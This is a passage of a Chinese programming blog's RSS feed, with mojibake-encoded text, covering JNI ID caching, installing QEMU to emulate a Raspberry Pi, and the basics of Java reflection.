&lt;h3 id="262-ç¼“å­˜æ–¹æ³•">2.6.2 ç¼“å­˜æ–¹æ³•&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>åœ¨ç”¨çš„æ—¶å€™ç¼“å­˜&lt;/p>
&lt;p>åœ¨nativeä»£ç ä¸­ä½¿ç”¨staticå±€éƒ¨å˜é‡æ¥ä¿å­˜å·²ç»æŸ¥è¯¢è¿‡çš„id,å°±ç¼“å­˜ä¸‹äº†idã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åœ¨Javaç±»åˆå§‹åŒ–æ—¶ç¼“å­˜&lt;/p>
&lt;p>æ¯”è¾ƒå¥½çš„æ–¹æ³•ï¼Œåœ¨nativeè°ƒç”¨å‰æŠŠæ‰€æœ‰IDå…¨éƒ¨ä¿å­˜ä¸‹æ¥ã€‚å¯ä»¥è®©Javaä»£ç åœ¨ç¬¬ä¸€æ¬¡åŠ è½½è¿™ä¸ªç±»çš„æ—¶å€™é¦–å…ˆè°ƒç”¨æœ¬åœ°ä»£ç åˆå§‹åŒ–æ‰€æœ‰çš„jfildID/jmethodID.è¿™æ ·å¯ä»¥çœå»å¤šæ¬¡ç¡®å®šIDæ˜¯å¦å­˜åœ¨çš„è¯­å¥ã€‚è¿™äº›jfildID/jmethodIDå®šä¹‰åœ¨C++çš„å…¨å±€ã€‚å½“javaç±»å¸è½½æˆ–è€…é‡æ–°åŠ è½½çš„æ—¶å€™ï¼Œä¹Ÿä¼šé‡æ–°è®¡ç®—ID.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">TestNative&lt;/span>&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">static&lt;/span>&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">initNativeIDs&lt;/span>&lt;span class="o">();&lt;/span> &lt;span class="c1">//é™æ€ä»£ç å—è¿›è¡Œåˆå§‹åŒ–
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">static&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">initNativeIDs&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">propInt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">String&lt;/span> &lt;span class="n">propStr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">otherNative&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">jfieldID g_propInt_id = 0;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">jfieldID g_propStr_id = 0;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">JNIEXPORT void JNICALL Java_Â·Â·Â·Â·initï¼ˆJNIEnv* env,jobject clazzï¼‰{
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jfieldID g_propInt_id = GetfieldID(clazz,&amp;#34;propInt&amp;#34;,&amp;#34;I&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jfieldID g_propStr_id = GetfieldID(clazz,&amp;#34;propStr&amp;#34;,&amp;#34;/Ljava/lang/String;&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">JNIEXPORT void JNICALL Java_Â·Â·Â·Â·otherï¼ˆJNIEnv* env,jobject clazzï¼‰{
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="æ€»ç»“">æ€»ç»“&lt;/h3>
&lt;p>â€‹ ä¸»è¦æ˜¯NDKå¼€å‘ç›¸å…³ã€‚&lt;/p>
&lt;p>â€‹ æ„Ÿè§‰ç³»ç»Ÿçš„å­¦äº†ä¸€éè¿˜æ˜¯æ„Ÿè§‰ä¸é”™çš„ã€‚&lt;/p>
&lt;p>å¯ä»¥å¤šæ‰¾ç½‘ä¸Šçš„ä¾‹å­æ¥ç»ƒä¹ ç»ƒä¹ ï¼ŒåŠ æ·±å¯¹JNI çš„äº†è§£ã€‚&lt;/p></description></item><item><title>QUMEçš„å®‰è£…ä½¿ç”¨(è¡¥å……)</title><link>https://ykiko.top/p/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85/</link><pubDate>Thu, 09 Aug 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="qumeçš„å®‰è£…ä½¿ç”¨è¡¥å……">QUMEçš„å®‰è£…ä½¿ç”¨(è¡¥å……)&lt;/h1>
&lt;h1 id="qemuçš„å®‰è£…ä½¿ç”¨">QEMUçš„å®‰è£…ä½¿ç”¨&lt;/h1>
&lt;h3 id="å®‰è£…">å®‰è£…&lt;/h3>
&lt;p>WIndowsï¼šhttps://qemu.weilnetz.de/w64/ ä¸‹è½½exeå®‰è£…å°±è¡Œ&lt;/p>
&lt;p>MACOS:&lt;code>brew install qemu&lt;/code> or &lt;code>sudo port install qemu&lt;/code>&lt;/p>
&lt;p>LINUXï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Arch:&lt;/strong> &lt;code>pacman -S qemu&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Debian/Ubuntu:&lt;/strong> &lt;code>apt-get install qemu&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Fedora:&lt;/strong> &lt;code>dnf install @virtualization&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Gentoo:&lt;/strong> &lt;code>emerge --ask app-emulation/qemu&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>RHEL/CentOS:&lt;/strong> &lt;code>yum install qemu-kvm&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>SUSE:&lt;/strong> &lt;code>zypper install qemu&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>æºç å®‰è£…ï¼šhttps://download.qemu.org/&lt;/p>
&lt;p>wget&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar xvJf qemu-3.0.0-rc1.tar.xz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cd qemu-3.0.0-rc1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./configure
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>git&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">git clone git://git.qemu.org/qemu.git
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cd qemu
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git submodule init
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git submodule update --recursive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./configure
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æœ€æ–°çš„å¼€å‘å‘ç”Ÿåœ¨ä¸»åˆ†æ”¯ä¸Šã€‚ç¨³å®šçš„æ ‘ä½äºåä¸ºâ€œç¨³å®šxâ€çš„åˆ†æ”¯ä¸­ã€‚YYåˆ†æ”¯,Xã€‚YYæ˜¯å‘å¸ƒç‰ˆæœ¬ã€‚&lt;/p>
&lt;h3 id="æ ‘è“æ´¾å†…æ ¸åˆ¶ä½œåœ¨windowsä¸Š">æ ‘è“æ´¾å†…æ ¸åˆ¶ä½œï¼ˆåœ¨windowsä¸Š)&lt;/h3>
&lt;p>ä¸‹è½½æ ‘è“æ´¾ç³»ç»Ÿï¼šhttp://downloads.raspberrypi.org/raspbian/images/&lt;/p>
&lt;p>ä¸‹è½½qume çš„æ ‘è“æ´¾å†…æ ¸ï¼šÂ &lt;a class="link" href="https://github.com/dhruvvyas90/qemu-rpi-kernel" target="_blank" rel="noopener"
>https://github.com/dhruvvyas90/qemu-rpi-kernel&lt;/a> æ”¹åä¸ºkernel-qemuæ”¾åœ¨å’Œç³»ç»Ÿé•œåƒåŒç›®å½•ä¸‹&lt;/p>
&lt;p>æ”¾åœ¨äº†raspbiaç›®å½•ä¸‹&lt;/p>
&lt;p>&lt;code>qemu-system-arm.exe -kernel kernel-qemu -cpu arm1176 -m 512 -M versatilepb -dtbversatile-pb.dtb -no-reboot -append &amp;quot;root=/dev/sda2 panic=1rootfstype=ext4 rw&amp;quot; -net nic -net user,hostfwd=tcp::5022-:22 -hda 2018-06-27-raspbian-stretch.img&lt;/code>&lt;/p>
&lt;p>æ³¨æ„è‡ªå·±ä¸‹è½½çš„é•œåƒç‰ˆæœ¬&lt;/p>
&lt;h3 id="linuxä¸Š">Linuxä¸Š&lt;/h3>
&lt;p>å¾…è¡¥å……ã€‚ã€‚ã€‚&lt;/p></description></item><item><title>Javaåå°„æœºåˆ¶å­¦ä¹ ç¬”è®°</title><link>https://ykiko.top/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link><pubDate>Wed, 25 Jul 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid><description>&lt;h1 id="javaåå°„æœºåˆ¶å­¦ä¹ ç¬”è®°">Javaåå°„æœºåˆ¶å­¦ä¹ ç¬”è®°&lt;/h1>
&lt;h2 id="java-åå°„æœºåˆ¶å­¦ä¹ è®°å½•">Java åå°„æœºåˆ¶å­¦ä¹ è®°å½•&lt;/h2>
&lt;p>åœ¨é€†å‘ä¸­åå°„ä¹Ÿæ˜¯èƒ½ç»å¸¸çœ‹è§ï¼Œä¹‹å‰ç†è§£ä¸æ˜¯å¾ˆæ·±é€ï¼Œç°åœ¨æ¥é‡ç‚¹å­¦ä¹ ä¸€ä¸‹ï¼Œåšä¸ªç¬”è®°ã€‚&lt;/p>
&lt;h3 id="ä»€ä¹ˆæ˜¯åå°„æœºåˆ¶">ä»€ä¹ˆæ˜¯åå°„æœºåˆ¶ï¼Ÿ&lt;/h3>
&lt;p>åå°„(Reflection)æ˜¯Java ç¨‹åºå¼€å‘è¯­è¨€çš„ç‰¹å¾ä¹‹ä¸€ï¼Œå®ƒå…è®¸è¿è¡Œä¸­çš„ Java ç¨‹åºè·å–è‡ªèº«çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥æ“ä½œç±»æˆ–å¯¹è±¡çš„å†…éƒ¨å±æ€§ã€‚ é€šä¿—ä¸€ç‚¹ï¼šåœ¨åŠ¨æ€è¿è¡Œæ—¶ï¼Œè·å–åˆ°ä¸€ä¸ªç±»çš„æ‰€æœ‰æ–¹æ³•ä»¥åŠæˆå‘˜ã€‚ç®€è€Œè¨€ä¹‹ï¼Œé€šè¿‡åå°„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨&lt;strong>è¿è¡Œæ—¶&lt;/strong>è·å¾—ç¨‹åºæˆ–ç¨‹åºé›†ä¸­æ¯ä¸€ä¸ªç±»å‹çš„æˆå‘˜å’Œæˆå‘˜çš„ä¿¡æ¯ã€‚&lt;/p>
&lt;h3 id="ä½œç”¨">ä½œç”¨ï¼Ÿ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>1.åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ï¼›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>2.åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>3.åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼ˆé€šè¿‡åå°„ç”šè‡³å¯ä»¥è°ƒç”¨privateæ–¹æ³•ï¼‰ï¼›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>4.åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="æ˜¯è¿è¡Œæ—¶è€Œä¸æ˜¯ç¼–è¯‘æ—¶">&lt;strong>æ˜¯è¿è¡Œæ—¶è€Œä¸æ˜¯ç¼–è¯‘æ—¶&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>è·å–æŸäº›ç±»çš„ä¸€äº›å˜é‡ï¼Œè°ƒç”¨æŸäº›ç±»çš„ç§æœ‰æ–¹æ³•ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¢åŠ ä»£ç çš„çµæ´»æ€§ã€‚å¾ˆå¤šä¸»æµæ¡†æ¶éƒ½ä½¿ç”¨äº†åå°„æŠ€æœ¯.åƒsshæ¡†æ¶éƒ½é‡‡ç”¨ä¸¤ç§æŠ€æœ¯ xmlåšé…ç½®æ–‡ä»¶+åå°„æŠ€æœ¯.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="åŸºæœ¬ä½¿ç”¨">åŸºæœ¬ä½¿ç”¨&lt;/h3>
&lt;p>åå°„ç›¸å…³çš„ç±»ä¸€èˆ¬éƒ½åœ¨java.lang.relfect åŒ…é‡Œã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>è·å–Classå¯¹è±¡ 3ç§æ–¹æ³•&lt;/p>
&lt;p>(1)ä½¿ç”¨Classç±»çš„forNameé™æ€æ–¹æ³•:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">forName&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span> &lt;span class="n">className&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//åœ¨JDBCå¼€å‘ä¸­å¸¸ç”¨æ­¤æ–¹æ³•åŠ è½½æ•°æ®åº“é©±åŠ¨:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">forName&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">driver&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>(2)ç›´æ¥è·å–æŸä¸€ä¸ªå¯¹è±¡çš„classï¼Œæ¯”å¦‚:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">klass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">classInt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Integer&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">TYPE&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>(3)è°ƒç”¨æŸä¸ªå¯¹è±¡çš„getClass()æ–¹æ³•,æ¯”å¦‚:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">StringBuilder&lt;/span> &lt;span class="n">str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">StringBuilder&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;123&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">klass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">str&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getClass&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>åˆ¤æ–­æ˜¯å¦ä¸ºæŸä¸€ä¸ªç±»çš„å®ä¾‹&lt;/p>
&lt;p>ä¸€èˆ¬ä½¿ç”¨instanceofæ¥åˆ¤æ–­ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©åå°„ä¸­çš„Classå¯¹è±¡çš„isInstance()æ–¹æ³•æ¥åˆ¤æ–­ æ˜¯ä¸€ä¸ªNativeæ–¹æ³•ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">native&lt;/span> &lt;span class="kt">boolean&lt;/span> &lt;span class="nf">isInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>åˆ›å»ºå®ä¾‹&lt;/p>
&lt;p>é€šè¿‡æ”¾å°„æ¥ç”Ÿæˆå¯¹è±¡ä¸¤ç§æ–¹å¼ï¼š&lt;/p>
&lt;p>ï¼ˆ1ï¼‰ä½¿ç”¨Classå¯¹è±¡çš„newInstance()æ–¹æ³•æ¥åˆ›å»ºClasså¯¹è±¡å¯¹åº”ç±»çš„å®ä¾‹ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Object&lt;/span> &lt;span class="n">str&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">newInstance&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ï¼ˆ2ï¼‰å…ˆé€šè¿‡Classå¯¹è±¡è·å–æŒ‡å®šçš„Constructorå¯¹è±¡ï¼Œå†è°ƒç”¨Constructorå¯¹è±¡çš„newInstance()æ–¹æ³•æ¥åˆ›å»ºå®ä¾‹ã€‚è¿™ç§æ–¹æ³•å¯ä»¥ç”¨æŒ‡å®šçš„æ„é€ å™¨æ„é€ ç±»çš„å®ä¾‹ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">//è·å–Stringæ‰€å¯¹åº”çš„Classå¯¹è±¡
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Class&amp;lt;?&amp;gt; c = String.class;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">//è·å–Stringç±»å¸¦ä¸€ä¸ªStringå‚æ•°çš„æ„é€ å™¨
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Constructor constructor = c.getConstructor(String.class);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">//æ ¹æ®æ„é€ å™¨åˆ›å»ºå®ä¾‹
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Object obj = constructor.newInstance(&amp;#34;23333&amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">System.out.println(obj);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>è·å–æ–¹æ³•&lt;/p>
&lt;p>getDeclaredMethods()æ–¹æ³•è¿”å›ç±»æˆ–æ¥å£å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬å…¬å…±ã€ä¿æŠ¤ã€é»˜è®¤ï¼ˆåŒ…ï¼‰è®¿é—®å’Œç§æœ‰æ–¹æ³•ï¼Œä½†ä¸åŒ…æ‹¬ç»§æ‰¿çš„æ–¹æ³•ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">public Method[] getDeclaredMethods() throws SecurityException
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>getMethods()æ–¹æ³•è¿”å›æŸä¸ªç±»çš„æ‰€æœ‰å…¬ç”¨ï¼ˆpublicï¼‰æ–¹æ³•ï¼ŒåŒ…æ‹¬å…¶ç»§æ‰¿ç±»çš„å…¬ç”¨æ–¹æ³•ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">public Method[] getMethods() throws SecurityException
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
